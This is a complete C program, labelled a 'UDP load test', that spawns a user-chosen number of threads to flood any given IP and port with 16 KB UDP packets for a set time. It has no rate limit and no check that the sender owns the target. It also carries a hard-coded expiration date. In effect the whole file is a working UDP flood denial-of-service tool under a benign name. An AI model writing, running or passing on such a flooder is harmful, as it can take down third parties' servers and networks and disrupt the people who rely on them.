#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define BUFFER_SIZE 16384
#define EXPIRATION_YEAR 2025
#define EXPIRATION_MONTH 3
#define EXPIRATION_DAY 10

typedef struct {
    char *target_ip;
    int target_port;
    int duration;
    int thread_id;
} load_test_params_t;

void *udp_load_test(void *args) {
    load_test_params_t *params = (load_test_params_t *)args;
    struct sockaddr_in target;
    int sock;
    char buffer[BUFFER_SIZE];
    memset(buffer, 0xFF, BUFFER_SIZE);

    target.sin_family = AF_INET;
    target.sin_port = htons(params->target_port);
    inet_pton(AF_INET, params->target_ip, &target.sin_addr);

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    time_t end_time = time(NULL) + params->duration;
    while (time(NULL) < end_time) {
        sendto(sock, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&target, sizeof(target));
    }
    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <PORT> <TIME> <THREADS>\n", argv[0]);
        return EXIT_FAILURE;
    }

    // Expiration check
    time_t now = time(NULL);
    struct tm *current_time = localtime(&now);
    if ((current_time->tm_year + 1900) > EXPIRATION_YEAR ||
        ((current_time->tm_year + 1900) == EXPIRATION_YEAR && (current_time->tm_mon + 1) > EXPIRATION_MONTH) ||
        ((current_time->tm_year + 1900) == EXPIRATION_YEAR && (current_time->tm_mon + 1) == EXPIRATION_MONTH && current_time->tm_mday > EXPIRATION_DAY)) {
        printf("This test tool has expired. Please update.\n");
        return EXIT_FAILURE;
    }

    int thread_count = atoi(argv[4]);
    pthread_t *threads = malloc(thread_count * sizeof(pthread_t));
    load_test_params_t *params = malloc(thread_count * sizeof(load_test_params_t));

    printf("Starting UDP load test on %s:%d for %d seconds with %d threads...\n", argv[1], atoi(argv[2]), atoi(argv[3]), thread_count);

    for (int i = 0; i < thread_count; i++) {
        params[i].target_ip = argv[1];
        params[i].target_port = atoi(argv[2]);
        params[i].duration = atoi(argv[3]);
        params[i].thread_id = i;
        pthread_create(&threads[i], NULL, udp_load_test, &params[i]);
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    free(threads);
    free(params);

    printf("UDP load test completed.\n");
    return EXIT_SUCCESS;
}
